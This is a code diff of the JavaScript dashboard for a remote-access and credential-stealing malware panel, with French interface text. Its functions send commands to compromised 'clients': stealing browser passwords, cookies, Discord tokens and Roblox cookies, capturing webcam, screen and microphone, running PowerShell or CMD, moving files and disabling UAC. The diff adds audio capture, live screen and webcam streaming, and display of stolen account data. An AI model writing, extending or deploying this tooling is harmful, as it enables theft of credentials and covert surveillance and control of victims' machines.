@@ -11,6 +11,11 @@ let fileExplorerCurrentPath = null;
 let processSort = { field: null, asc: true };
 let currentDisplayedCommand = null;
 let isOnline = true;
+let isCommandExecuting = false;
+let currentProcessingCommandId = null;
+let captureAllMonitors = true;
+let selectedMonitors = new Set();
+let currentAudioSettings = { hours: 0, minutes: 1, seconds: 0, input_device: null, output_device: null };
 
 // Sélection multiple
 let selectedClients = new Set();
@@ -21,69 +26,45 @@ const commandDisplayNames = {
     ping: 'Ping', system_info: 'Systeme', discord_data: 'Discord',
     roblox_cookie: 'Roblox', browser_passwords: 'Mots de passe',
     browser_cookies: 'Cookies', screenshot: 'Capture d\'ecran',
-    screenshot_webcam: 'Webcam', clipboard: 'Presse-papier',
+    screenshot_webcam: 'Webcam', capture_audio: 'Audio', stream_screen: 'Stream Ecran',
+    stream_webcam: 'Stream Webcam', clipboard: 'Presse-papier',
     list_processes: 'Processus', file_explorer: 'Explorateur fichiers',
     execute_ps: 'PowerShell', execute_cmd: 'CMD',
     download_file: 'Telechargement', upload_file: 'Upload',
-    disable_uac: 'Désactiver UAC', reboot: 'Redémarrer', force_update: 'Force Update'
+    disable_uac: 'Désactiver UAC', enable_uac: 'Activer UAC',
+    reboot: 'Redémarrer', force_update: 'Force Update'
 };
 
 const browserLogos = {
-    'Chrome': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="12" cy="12" r="4.5" fill="#fff"/>
-        <path d="M12 7.5a4.5 4.5 0 1 1 0 9 4.5 4.5 0 0 1 0-9z" fill="#4285F4"/>
-        <path d="M12 7.5h9.18A10.5 10.5 0 0 0 3.1 8.25L7.65 16.05A4.5 4.5 0 0 1 12 7.5z" fill="#EA4335"/>
-        <path d="M21.18 7.5H12a4.5 4.5 0 0 1 3.9 6.75l4.35 7.5A10.5 10.5 0 0 0 21.18 7.5z" fill="#FBBC05"/>
-        <path d="M12 16.5a4.5 4.5 0 0 1-3.9-6.75L3.76 2.23A10.5 10.5 0 0 0 20.25 21.75L15.9 14.25A4.5 4.5 0 0 1 12 16.5z" fill="#34A853"/>
-    </svg>`,
-    'Firefox': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="12" cy="12" r="10" fill="#FF9500"/>
-        <path d="M12 2C7.58 2 4 5.58 4 10c0 1.85.63 3.55 1.67 4.92C6.8 9.6 10.1 6.5 14 6.5c1.1 0 2 .3 2.8.8C15.1 5.2 13.6 4 12 4c-.7 0-1.4.1-2 .3C11 2.1 12 2 12 2z" fill="#FF0039"/>
-        <circle cx="12" cy="13" r="6" fill="#0060DF"/>
-        <path d="M6.3 10.5C6.1 11 6 11.5 6 12c0 3.31 2.69 6 6 6s6-2.69 6-6c0-.5-.07-1-.2-1.5C16.5 13.5 14.4 15 12 15s-4.5-1.5-5.7-4.5z" fill="#FF9500"/>
-    </svg>`,
-    'Edge': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <defs><linearGradient id="eg1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0078D4"/><stop offset="100%" stop-color="#00B4F0"/></linearGradient>
-        <linearGradient id="eg2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#00B4F0"/><stop offset="100%" stop-color="#00D8A3"/></linearGradient></defs>
-        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="url(#eg1)"/>
-        <path d="M18 10c0 3.31-2.69 6-6 6-1.5 0-2.87-.55-3.9-1.46C9.36 17.26 12 19 15 19c3.5 0 6-2.91 6-6.5 0-1-.22-1.95-.6-2.8C20 10.41 19 10 18 10z" fill="url(#eg2)"/>
-        <path d="M6 12c0-3.31 2.69-6 6-6 1 0 1.95.25 2.78.69C13.27 5.26 12 5 10.5 5 7 5 4 7.91 4 12c0 1 .22 1.95.6 2.8.52.3 1.13.2 1.4-.3C6 13.7 6 12.86 6 12z" fill="#fff" opacity="0.4"/>
-    </svg>`,
-    'Brave': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 2L3.5 6v6c0 4.5 3.7 8.7 8.5 10 4.8-1.3 8.5-5.5 8.5-10V6L12 2z" fill="#FB542B"/>
-        <path d="M15.5 9.5l-1-1-1 1-1.5-1.5-1.5 1.5-1-1-1 1L9 11l1 1-1 1 1.5 1.5 1 1 1-1 1 1 1-1 1.5-1.5-1-1 1-1-1.5-1.5z" fill="#fff"/>
-    </svg>`,
-    'Opera': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="12" cy="12" r="10" fill="#FF1B2D"/>
-        <ellipse cx="12" cy="12" rx="5" ry="7.5" fill="#fff"/>
-        <ellipse cx="12" cy="12" rx="3" ry="7.5" fill="#FF1B2D"/>
-    </svg>`,
-    'Opera GX': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="12" cy="12" r="10" fill="#FF1B2D"/>
-        <ellipse cx="12" cy="12" rx="5" ry="7.5" fill="#fff"/>
-        <ellipse cx="12" cy="12" rx="3" ry="7.5" fill="#FF1B2D"/>
-        <path d="M2 12h20M2 8h20M2 16h20" stroke="#00D4FF" stroke-width="0.5" opacity="0.6"/>
-    </svg>`,
-    'Unknown': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="12" cy="12" r="10" fill="#4a4f65"/>
-        <text x="12" y="16" text-anchor="middle" font-size="12" fill="#fff">?</text>
-    </svg>`
+    'Chrome': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="4.5" fill="#fff"/><path d="M12 7.5a4.5 4.5 0 1 1 0 9 4.5 4.5 0 0 1 0-9z" fill="#4285F4"/><path d="M12 7.5h9.18A10.5 10.5 0 0 0 3.1 8.25L7.65 16.05A4.5 4.5 0 0 1 12 7.5z" fill="#EA4335"/><path d="M21.18 7.5H12a4.5 4.5 0 0 1 3.9 6.75l4.35 7.5A10.5 10.5 0 0 0 21.18 7.5z" fill="#FBBC05"/><path d="M12 16.5a4.5 4.5 0 0 1-3.9-6.75L3.76 2.23A10.5 10.5 0 0 0 20.25 21.75L15.9 14.25A4.5 4.5 0 0 1 12 16.5z" fill="#34A853"/></svg>`,
+    'Firefox': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#FF9500"/><path d="M12 2C7.58 2 4 5.58 4 10c0 1.85.63 3.55 1.67 4.92C6.8 9.6 10.1 6.5 14 6.5c1.1 0 2 .3 2.8.8C15.1 5.2 13.6 4 12 4c-.7 0-1.4.1-2 .3C11 2.1 12 2 12 2z" fill="#FF0039"/><circle cx="12" cy="13" r="6" fill="#0060DF"/><path d="M6.3 10.5C6.1 11 6 11.5 6 12c0 3.31 2.69 6 6 6s6-2.69 6-6c0-.5-.07-1-.2-1.5C16.5 13.5 14.4 15 12 15s-4.5-1.5-5.7-4.5z" fill="#FF9500"/></svg>`,
+    'Edge': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="eg1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0078D4"/><stop offset="100%" stop-color="#00B4F0"/></linearGradient><linearGradient id="eg2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#00B4F0"/><stop offset="100%" stop-color="#00D8A3"/></linearGradient></defs><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="url(#eg1)"/><path d="M18 10c0 3.31-2.69 6-6 6-1.5 0-2.87-.55-3.9-1.46C9.36 17.26 12 19 15 19c3.5 0 6-2.91 6-6.5 0-1-.22-1.95-.6-2.8C20 10.41 19 10 18 10z" fill="url(#eg2)"/><path d="M6 12c0-3.31 2.69-6 6-6 1 0 1.95.25 2.78.69C13.27 5.26 12 5 10.5 5 7 5 4 7.91 4 12c0 1 .22 1.95.6 2.8.52.3 1.13.2 1.4-.3C6 13.7 6 12.86 6 12z" fill="#fff" opacity="0.4"/></svg>`,
+    'Brave': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L3.5 6v6c0 4.5 3.7 8.7 8.5 10 4.8-1.3 8.5-5.5 8.5-10V6L12 2z" fill="#FB542B"/><path d="M15.5 9.5l-1-1-1 1-1.5-1.5-1.5 1.5-1-1-1 1L9 11l1 1-1 1 1.5 1.5 1 1 1-1 1 1 1-1 1.5-1.5-1-1 1-1-1.5-1.5z" fill="#fff"/></svg>`,
+    'Opera': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#FF1B2D"/><ellipse cx="12" cy="12" rx="5" ry="7.5" fill="#fff"/><ellipse cx="12" cy="12" rx="3" ry="7.5" fill="#FF1B2D"/></svg>`,
+    'Opera GX': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#FF1B2D"/><ellipse cx="12" cy="12" rx="5" ry="7.5" fill="#fff"/><ellipse cx="12" cy="12" rx="3" ry="7.5" fill="#FF1B2D"/><path d="M2 12h20M2 8h20M2 16h20" stroke="#00D4FF" stroke-width="0.5" opacity="0.6"/></svg>`,
+    'Unknown': `<svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="#4a4f65"/><text x="12" y="16" text-anchor="middle" font-size="12" fill="#fff">?</text></svg>`
 };
 
 const paymentLogos = {
-    CreditCard: `<svg width="32" height="22" viewBox="0 0 32 22" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="1" y="1" width="30" height="20" rx="3" fill="#1a1f3a" stroke="#3b82f6" stroke-width="1"/>
-        <rect x="1" y="6" width="30" height="4" fill="#3b82f6" opacity="0.8"/>
-        <rect x="4" y="14" width="8" height="2" rx="0.5" fill="#64748b"/>
-        <rect x="14" y="14" width="5" height="2" rx="0.5" fill="#64748b"/>
-        <circle cx="25" cy="16" r="2.5" fill="#f59e0b" opacity="0.7"/>
-        <circle cx="27.5" cy="16" r="2.5" fill="#ef4444" opacity="0.5"/>
-    </svg>`,
-    PayPal: `<svg width="32" height="22" viewBox="0 0 32 22" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="1" y="1" width="30" height="20" rx="3" fill="#f5f7fa" stroke="#d1d5db" stroke-width="0.5"/>
-        <path d="M12 5h5c2.5 0 3.5 1.5 3.2 3.5-.3 2-1.8 3.5-4.2 3.5h-2.5l-.8 4H11l1-5zm3.5 4.5c1 0 1.7-.5 1.8-1.5.1-.7-.3-1.2-1.2-1.2h-1.5l-.5 2.7h1.4z" fill="#003087"/>
-        <path d="M14.5 5h5c2.5 0 3.5 1.5 3.2 3.5-.3 2-1.8 3.5-4.2 3.5h-2.5l-.8 4H13.5l1-5zm3.5 4.5c1 0 1.7-.5 1.8-1.5.1-.7-.3-1.2-1.2-1.2h-1.5l-.5 2.7h1.4z" fill="#0070e0" opacity="0.6"/>
-    </svg>`
+    CreditCard: `<svg width="32" height="22" viewBox="0 0 32 22" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="1" y="1" width="30" height="20" rx="3" fill="#1a1f3a" stroke="#3b82f6" stroke-width="1"/><rect x="1" y="6" width="30" height="4" fill="#3b82f6" opacity="0.8"/><rect x="4" y="14" width="8" height="2" rx="0.5" fill="#64748b"/><rect x="14" y="14" width="5" height="2" rx="0.5" fill="#64748b"/><circle cx="25" cy="16" r="2.5" fill="#f59e0b" opacity="0.7"/><circle cx="27.5" cy="16" r="2.5" fill="#ef4444" opacity="0.5"/></svg>`,
+    PayPal: `<svg width="32" height="22" viewBox="0 0 32 22" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="1" y="1" width="30" height="20" rx="3" fill="#f5f7fa" stroke="#d1d5db" stroke-width="0.5"/><path d="M12 5h5c2.5 0 3.5 1.5 3.2 3.5-.3 2-1.8 3.5-4.2 3.5h-2.5l-.8 4H11l1-5zm3.5 4.5c1 0 1.7-.5 1.8-1.5.1-.7-.3-1.2-1.2-1.2h-1.5l-.5 2.7h1.4z" fill="#003087"/><path d="M14.5 5h5c2.5 0 3.5 1.5 3.2 3.5-.3 2-1.8 3.5-4.2 3.5h-2.5l-.8 4H13.5l1-5zm3.5 4.5c1 0 1.7-.5 1.8-1.5.1-.7-.3-1.2-1.2-1.2h-1.5l-.5 2.7h1.4z" fill="#0070e0" opacity="0.6"/></svg>`
+};
+
+const infoIcons = {
+    userId: '<i class="fas fa-id-card info-icon"></i>',
+    email: '<i class="fas fa-envelope info-icon"></i>',
+    phone: '<i class="fas fa-phone info-icon"></i>',
+    friends: '<i class="fas fa-users info-icon"></i>',
+    guilds: '<i class="fas fa-server info-icon"></i>',
+    admin: '<i class="fas fa-crown info-icon" style="color:var(--amber);"></i>',
+    mfa: '<i class="fas fa-shield-alt info-icon"></i>',
+    flags: '<i class="fas fa-flag info-icon"></i>',
+    locale: '<i class="fas fa-globe info-icon"></i>',
+    verified: '<i class="fas fa-check-circle info-icon"></i>',
+    nitro: '<i class="fas fa-gem info-icon" style="color:#ff73fa;"></i>',
+    boost: '<i class="fas fa-rocket info-icon"></i>',
+    payment: '<i class="fas fa-credit-card info-icon"></i>',
+    token: '<i class="fas fa-key info-icon"></i>'
 };
 
 // ========== OFFLINE DETECTION ==========
@@ -127,6 +108,7 @@ document.querySelectorAll('.nav-item').forEach(item => {
         document.getElementById(`${page}-page`).classList.add('active');
         document.getElementById('page-title').innerText = item.innerText.trim();
         if (page === 'clients') loadClients();
+        if (page === 'dashboard') loadRecentClients();
     });
 });
 
@@ -135,11 +117,9 @@ function toggleSelectAll() {
     const allRows = document.querySelectorAll('.recent-client-row[data-machine-id]');
     const allIds = Array.from(allRows).map(r => r.dataset.machineId);
     if (selectedClients.size === allIds.length) {
-        // tout déselectionner
         selectedClients.clear();
         allRows.forEach(r => r.classList.remove('selected'));
     } else {
-        // tout sélectionner
         allIds.forEach(id => selectedClients.add(id));
         allRows.forEach(r => r.classList.add('selected'));
     }
@@ -167,7 +147,6 @@ function updateSelectAllButton() {
     }
 }
 
-// Clic sur nom PC dans le dashboard
 document.addEventListener('click', function(e) {
     const row = e.target.closest('.recent-client-row');
     if (row && row.dataset.machineId) {
@@ -175,13 +154,11 @@ document.addEventListener('click', function(e) {
     }
 });
 
-// Refresh des sélectionnés : relance une commande system_info pour chaque
 function refreshSelected() {
     const btn = document.getElementById('refresh-btn');
     const icon = btn.querySelector('i');
     icon.classList.add('refresh-spinning');
 
-    // Si aucun PC sélectionné, on prend tous les PC affichés
     let targets = [];
     if (selectedClients.size === 0) {
         const allRows = document.querySelectorAll('.recent-client-row[data-machine-id]');
@@ -209,7 +186,6 @@ function refreshSelected() {
     });
 }
 
-// Force Update pour les sélectionnés
 function forceUpdateSelected() {
     if (selectedClients.size === 0) {
         showNotification('info', 'Aucun PC sélectionné');
@@ -221,7 +197,6 @@ function forceUpdateSelected() {
     showNotification('info', `Force Update envoyée à ${selectedClients.size} PC(s)`);
 }
 
-// Désactiver UAC sur les sélectionnés
 function disableUacSelected() {
     if (selectedClients.size === 0) {
         showNotification('info', 'Aucun PC sélectionné');
@@ -255,7 +230,6 @@ async function sendCommandAndUpdate(machineId, cmdType, params = {}) {
         });
         const data = await res.json();
         if (!data.command_id) throw new Error(data.error || 'Erreur');
-        // Optionnel : on pourrait attendre le résultat, mais ici on le lance simplement
         return true;
     } catch (e) {
         showNotification('error', `Erreur pour ${machineId}: ${e.message}`);
@@ -282,11 +256,13 @@ async function loadRecentClients() {
         const clients = await res.json();
         clientsData = clients;
         renderRecentClients(clients.slice(0, 8));
+        loadStats();
     } catch(e) { console.error(e); }
 }
 
 function renderRecentClients(clients) {
     const container = document.getElementById('recent-clients');
+    if (!container) return;
     if (!clients.length) {
         container.innerHTML = '<div class="no-data">Aucun client connecte</div>';
         return;
@@ -330,6 +306,7 @@ function formatBytes(bytes) {
 
 function renderClients(clients) {
     const container = document.getElementById('clients-grid');
+    if (!container) return;
     if (!clients.length) {
         container.innerHTML = '<div class="no-data">Aucun client connecte</div>';
         return;
@@ -364,8 +341,25 @@ function renderClients(clients) {
     updateConnectionStatus();
 }
 
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        if (isCommandExecuting) {
+            e.preventDefault();
+            showNotification('info', 'Une commande est en cours, veuillez attendre');
+            return false;
+        }
+        if (document.getElementById('command-modal')?.style.display === 'flex') {
+            closeModal();
+        } else if (document.getElementById('result-modal')?.style.display === 'flex') {
+            closeResultModal();
+        } else if (document.getElementById('delete-confirm-modal')?.style.display === 'flex') {
+            closeDeleteConfirmModal();
+        }
+    }
+});
+
 function filterClients() {
-    const s = document.getElementById('client-search').value.toLowerCase();
+    const s = document.getElementById('client-search')?.value.toLowerCase() || '';
     const filtered = clientsData.filter(c =>
         (c.computer_name||'').toLowerCase().includes(s) ||
         (c.username||'').toLowerCase().includes(s) ||
@@ -387,11 +381,11 @@ function formatDate(d) {
     } catch(e) { return d; }
 }
 
-// ========== ESCAPING ==========
 function escapeHtml(str) {
     if (!str) return '';
     return str.replace(/[&<>`"]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','`':'&#96;','"':'&quot;'})[m]);
 }
+
 function escapeAttr(str) {
     if (!str) return '';
     return str.replace(/[&<>`"\\]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','`':'&#96;','"':'&quot;','\\':'\\\\'})[m]);
@@ -400,6 +394,13 @@ function escapeAttr(str) {
 // ========== COMMAND MODAL ==========
 function openCommandModal(machineId, clientName) {
     if (!isOnline) return;
+    
+    const client = clientsData.find(c => c.machine_id === machineId);
+    if (!client || !client.online) {
+        showNotification('error', 'Ce client est hors ligne');
+        return;
+    }
+    
     currentClient = machineId;
     document.getElementById('modal-client-name').innerText = clientName;
     document.getElementById('command-modal').style.display = 'flex';
@@ -416,7 +417,8 @@ function openCommandModal(machineId, clientName) {
     const trigger = document.getElementById('command-type-trigger');
     const optionsContainer = document.getElementById('command-type-options');
     const hiddenInput = document.getElementById('command-type');
-    const textSpan = trigger.querySelector('.selected-text');
+    const textSpan = trigger?.querySelector('.selected-text');
+    if (!trigger || !optionsContainer) return;
 
     trigger.addEventListener('click', (e) => {
         e.stopPropagation();
@@ -428,7 +430,7 @@ function openCommandModal(machineId, clientName) {
             const value = option.dataset.value;
             hiddenInput.value = value;
             const iconEl = option.querySelector('i');
-            if (iconEl) {
+            if (iconEl && textSpan) {
                 const clone = iconEl.cloneNode(true);
                 textSpan.innerHTML = '';
                 textSpan.appendChild(clone);
@@ -443,33 +445,60 @@ function openCommandModal(machineId, clientName) {
         optionsContainer.classList.remove('open');
     });
 })();
-
 function handleCommandTypeChange(value) {
     const g = document.getElementById('command-params-group');
     const textarea = document.getElementById('command-params');
-    if (['execute_ps', 'execute_cmd', 'download_file', 'upload_file', 'file_explorer', 'kill_process'].includes(value)) {
-        g.style.display = 'block';
+    if (['capture_audio', 'stream_screen', 'stream_webcam'].includes(value)) {
+        if (g) g.style.display = 'none';
+        return;
+    }
+    if (['execute_ps', 'execute_cmd', 'download_file', 'upload_file', 'file_explorer', 'kill_process', 'reboot', 'force_update', 'disable_uac', 'enable_uac'].includes(value)) {
+        if (g) g.style.display = 'block';
         switch(value) {
-            case 'execute_ps': textarea.value = 'Get-Process | Select-Object -First 10'; break;
-            case 'execute_cmd': textarea.value = 'dir'; break;
-            case 'file_explorer': textarea.value = 'C:\\Users'; break;
-            case 'download_file': textarea.value = 'C:\\Users\\Public\\example.txt'; break;
-            case 'upload_file': textarea.value = '{"path": "C:\\test.txt", "data": "base64..."}'; break;
-            default: textarea.value = '';
+            case 'execute_ps': if(textarea) textarea.value = 'Get-Process | Select-Object -First 10'; break;
+            case 'execute_cmd': if(textarea) textarea.value = 'dir'; break;
+            case 'file_explorer': if(textarea) textarea.value = 'C:\\Users'; break;
+            case 'download_file': if(textarea) textarea.value = 'C:\\Users\\Public\\example.txt'; break;
+            case 'upload_file': if(textarea) textarea.value = '{"path": "C:\\test.txt", "data": "base64..."}'; break;
+            case 'kill_process': if(textarea) textarea.value = ''; break;
+            case 'reboot': if(textarea) textarea.value = ''; break;
+            case 'force_update': if(textarea) textarea.value = ''; break;
+            case 'disable_uac': if(textarea) textarea.value = ''; break;
+            case 'enable_uac': if(textarea) textarea.value = ''; break;
+            default: if(textarea) textarea.value = '';
         }
     } else {
-        g.style.display = 'none';
+        if (g) g.style.display = 'none';
     }
 }
-
 // ========== EXECUTION DE COMMANDE ==========
 async function executeCommand() {
     if (!isOnline) { showNotification('error', 'Vous etes hors ligne'); return; }
+    if (isCommandExecuting) {
+        showNotification('info', 'Une commande est deja en cours d\'execution');
+        return;
+    }
 
     clearInterval(processingTimer);
     if (abortController) { abortController.abort(); abortController = null; }
 
     const commandType = document.getElementById('command-type').value;
+    
+    // Ouvrir les menus paramétrés pour audio/stream
+    if (commandType === 'capture_audio') {
+        closeModal();
+        openAudioSettings();
+        return;
+    } else if (commandType === 'stream_screen') {
+        closeModal();
+        openScreenSettings();
+        return;
+    } else if (commandType === 'stream_webcam') {
+        closeModal();
+        openWebcamSettings();
+        return;
+    }
+
     let params = {};
 
     if (commandType === 'execute_ps' || commandType === 'execute_cmd') {
@@ -491,6 +520,7 @@ async function executeCommand() {
     currentDisplayedCommand = { type: commandType, params: params };
     commandStartTime = Date.now();
     cancelRequested = false;
+    isCommandExecuting = true;
     abortController = new AbortController();
 
     try {
@@ -503,13 +533,19 @@ async function executeCommand() {
         const data = await res.json();
         if (data.command_id) {
             currentCommandId = data.command_id;
+            currentProcessingCommandId = data.command_id;
             closeModal();
             showProcessing(data.command_id, commandStartTime);
         } else {
+            isCommandExecuting = false;
             alert('Erreur : ' + (data.error || 'inconnue'));
         }
     } catch (e) {
-        if (e.name === 'AbortError') { console.log('Commande annulee'); }
+        isCommandExecuting = false;
+        if (e.name === 'AbortError') { 
+            console.log('Commande annulee'); 
+            showNotification('info', 'Commande annulee');
+        }
         else { alert('Erreur reseau'); }
     }
 }
@@ -519,6 +555,8 @@ function showProcessing(commandId, startTime) {
     cancelRequested = false;
     document.getElementById('processing-modal').style.display = 'flex';
     document.getElementById('cancel-btn').style.display = 'inline-flex';
+    const modal = document.getElementById('processing-modal');
+    modal.style.pointerEvents = 'auto';
     let s = 0;
     document.getElementById('processing-timer').innerText = '0s';
     clearInterval(processingTimer);
@@ -530,35 +568,88 @@ function showProcessing(commandId, startTime) {
 }
 
 async function waitForResult(commandId, attempts = 0, startTime) {
-    if (cancelRequested) { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; return; }
-    if (attempts > 30) { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; alert('Timeout'); return; }
+    if (cancelRequested) { 
+        clearInterval(processingTimer); 
+        document.getElementById('processing-modal').style.display = 'none'; 
+        document.getElementById('cancel-btn').style.display = 'none';
+        isCommandExecuting = false;
+        currentProcessingCommandId = null;
+        return; 
+    }
+    if (attempts > 60) { 
+        clearInterval(processingTimer); 
+        document.getElementById('processing-modal').style.display = 'none'; 
+        document.getElementById('cancel-btn').style.display = 'none';
+        showNotification('error', 'Timeout (60 secondes)'); 
+        isCommandExecuting = false;
+        currentProcessingCommandId = null;
+        return; 
+    }
     try {
         abortController = new AbortController();
         const res = await fetch(`/api/command_result/${commandId}`, { signal: abortController.signal });
-        if (cancelRequested) { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; return; }
+        if (cancelRequested) { 
+            clearInterval(processingTimer); 
+            document.getElementById('processing-modal').style.display = 'none'; 
+            document.getElementById('cancel-btn').style.display = 'none';
+            isCommandExecuting = false;
+            currentProcessingCommandId = null;
+            return; 
+        }
         const data = await res.json();
         if (data.status === 'executed') {
-            if (cancelRequested) { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; return; }
+            if (cancelRequested) { 
+                clearInterval(processingTimer); 
+                document.getElementById('processing-modal').style.display = 'none'; 
+                document.getElementById('cancel-btn').style.display = 'none';
+                isCommandExecuting = false;
+                currentProcessingCommandId = null;
+                return; 
+            }
             clearInterval(processingTimer);
             document.getElementById('processing-modal').style.display = 'none';
             document.getElementById('cancel-btn').style.display = 'none';
             showResult(data.result, data.command_type, startTime);
+            isCommandExecuting = false;
+            currentProcessingCommandId = null;
         } else {
-            setTimeout(() => waitForResult(commandId, attempts + 1, startTime), 2000);
+            setTimeout(() => waitForResult(commandId, attempts + 1, startTime), 1000);
         }
     } catch (e) {
-        if (e.name === 'AbortError') { clearInterval(processingTimer); document.getElementById('processing-modal').style.display = 'none'; document.getElementById('cancel-btn').style.display = 'none'; }
-        else { if (!cancelRequested) setTimeout(() => waitForResult(commandId, attempts + 1, startTime), 2000); }
+        if (e.name === 'AbortError') { 
+            clearInterval(processingTimer); 
+            document.getElementById('processing-modal').style.display = 'none'; 
+            document.getElementById('cancel-btn').style.display = 'none';
+            isCommandExecuting = false;
+            currentProcessingCommandId = null;
+        }
+        else { 
+            if (!cancelRequested) setTimeout(() => waitForResult(commandId, attempts + 1, startTime), 1000);
+        }
     }
 }
 
 function cancelCommand() {
-    cancelRequested = true;
-    if (abortController) { abortController.abort(); abortController = null; }
-    clearInterval(processingTimer);
-    document.getElementById('processing-modal').style.display = 'none';
-    document.getElementById('cancel-btn').style.display = 'none';
-    currentCommandId = null;
+    if (currentProcessingCommandId) {
+        cancelRequested = true;
+        isCommandExecuting = false;
+        if (abortController) { 
+            abortController.abort(); 
+            abortController = null; 
+        }
+        clearInterval(processingTimer);
+        document.getElementById('processing-modal').style.display = 'none';
+        document.getElementById('cancel-btn').style.display = 'none';
+        currentCommandId = null;
+        currentProcessingCommandId = null;
+        showNotification('info', 'Commande annulee');
+        
+        fetch('/api/cancel_command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ command_id: currentProcessingCommandId })
+        }).catch(() => {});
+    }
 }
 
 // ========== NOTIFICATIONS ==========
@@ -593,8 +684,12 @@ function copyToClipboard(text) {
     });
 }
 
-// ========== REFRESH CURRENT RESULT (1 MINUTE TIMEOUT) ==========
+// ========== REFRESH CURRENT RESULT ==========
 async function refreshCurrentResult() {
+    if (isCommandExecuting) {
+        showNotification('info', 'Une commande est en cours, veuillez attendre');
+        return;
+    }
     if (!currentDisplayedCommand || !currentClient || !isOnline) return;
     const btn = document.getElementById('refresh-cmd-btn');
     const icon = btn?.querySelector('i');
@@ -608,7 +703,19 @@ async function refreshCurrentResult() {
         });
         const data = await res.json();
         if (data.command_id) {
-            const result = await pollCommandResult(data.command_id, REFRESH_TIMEOUT);
+            const commandId = data.command_id;
+            let result = null;
+            for (let i = 0; i < REFRESH_TIMEOUT; i++) {
+                await new Promise(r => setTimeout(r, 1000));
+                try {
+                    const checkRes = await fetch(`/api/command_result/${commandId}`);
+                    const checkData = await checkRes.json();
+                    if (checkData.status === 'executed') {
+                        result = checkData.result;
+                        break;
+                    }
+                } catch(e) {}
+            }
             if (result) {
                 showResult(result, currentDisplayedCommand.type, startTime);
                 showNotification('success', 'Donnees actualisees');
@@ -632,7 +739,8 @@ function showResult(result, commandType, startTime) {
     const titleIcons = {
         ping: 'fas fa-heartbeat', system_info: 'fas fa-info-circle', discord_data: 'fab fa-discord',
         roblox_cookie: 'fas fa-gamepad', browser_passwords: 'fas fa-key', browser_cookies: 'fas fa-cookie-bite',
-        screenshot: 'fas fa-camera', screenshot_webcam: 'fas fa-video', clipboard: 'fas fa-copy',
+        screenshot: 'fas fa-camera', screenshot_webcam: 'fas fa-video', capture_audio: 'fas fa-microphone',
+        stream_screen: 'fas fa-desktop', stream_webcam: 'fas fa-video', clipboard: 'fas fa-copy',
         list_processes: 'fas fa-list', file_explorer: 'fas fa-folder-open', download_file: 'fas fa-download',
         upload_file: 'fas fa-upload', execute_ps: 'fas fa-code', execute_cmd: 'fas fa-terminal',
         disable_uac: 'fas fa-shield-alt', reboot: 'fas fa-power-off', force_update: 'fas fa-download'
@@ -640,7 +748,8 @@ function showResult(result, commandType, startTime) {
     const titleIconColors = {
         ping: 'var(--green)', system_info: 'var(--accent)', discord_data: '#5865F2',
         roblox_cookie: 'var(--green)', browser_passwords: 'var(--amber)', browser_cookies: '#D2691E',
-        screenshot: '#8b8fa5', screenshot_webcam: '#8b8fa5', clipboard: '#8b8fa5',
+        screenshot: '#8b8fa5', screenshot_webcam: '#8b8fa5', capture_audio: '#8b8fa5',
+        stream_screen: '#8b8fa5', stream_webcam: '#8b8fa5', clipboard: '#8b8fa5',
         list_processes: '#8b8fa5', file_explorer: 'var(--amber)', download_file: 'var(--amber)',
         upload_file: 'var(--amber)', execute_ps: '#8b8fa5', execute_cmd: '#8b8fa5',
         disable_uac: 'var(--red)', reboot: 'var(--red)', force_update: 'var(--accent)'
@@ -649,8 +758,6 @@ function showResult(result, commandType, startTime) {
     const iconClass = titleIcons[commandType] || 'fas fa-check-circle';
     const iconColor = titleIconColors[commandType] || 'var(--accent)';
     title.innerHTML = `<i class="${iconClass}" style="color:${iconColor};"></i> ${displayName}`;
-
-    // ALL command types get a refresh button
